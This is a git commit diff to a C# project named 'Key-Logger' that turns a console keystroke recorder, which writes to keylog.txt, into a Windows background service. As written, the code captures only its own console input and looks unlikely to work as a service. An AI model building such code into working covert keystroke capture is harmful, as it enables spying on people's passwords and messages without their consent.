6468dc5fc2be8ab1784dd5490e63d77a75a550a2
taudet <thomas.audet@live.com>
2025-05-23 00:00:04 -0400

    added functionality to run this as a background service

--- Key-Logger/Program.cs
+++ Key-Logger/Program.cs
@@ -1,10 +1,48 @@
-﻿using (StreamWriter sw = new StreamWriter("keylog.txt", true))
+﻿using Microsoft.Extensions.DependencyInjection;
+using Microsoft.Extensions.Hosting;
+using Microsoft.Extensions.Logging;
+using System.IO;
+using System.Threading;
+using System.Threading.Tasks;
+
+var builder = Host.CreateApplicationBuilder(args);
+
+builder.Services.AddWindowsService();
+builder.Services.AddHostedService<KeyLoggerBackgroundService>();
+
+builder.Build().Run();
+
+public class KeyLoggerBackgroundService : BackgroundService
 {
-    ConsoleKeyInfo keyInfo = Console.ReadKey(true);
-    while (keyInfo.Key != ConsoleKey.Escape)
+    private readonly ILogger<KeyLoggerBackgroundService> _logger;
+    private readonly IHostApplicationLifetime _hostApplicationLifetime;
+
+    public KeyLoggerBackgroundService(
+        ILogger<KeyLoggerBackgroundService> logger,
+        IHostApplicationLifetime hostApplicationLifetime)
     {
-        sw.Write(keyInfo.KeyChar);
-        sw.Flush();
-        keyInfo = Console.ReadKey();
+        _logger = logger;
+        _hostApplicationLifetime = hostApplicationLifetime;
+    }
+
+    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
+    {
+        using (StreamWriter sw = new StreamWriter("keylog.txt", true))
+        {
+            while (!stoppingToken.IsCancellationRequested)
+            {
+                if (Console.KeyAvailable)
+                {
+                    var keyInfo = Console.ReadKey(true);
+                    if (keyInfo.Key == ConsoleKey.Escape)
+                        break;
+                    sw.Write(keyInfo.KeyChar);
+                    sw.Flush();
+                }
+                await Task.Delay(50, stoppingToken);
+            }
+        }
     }
 }
+
+
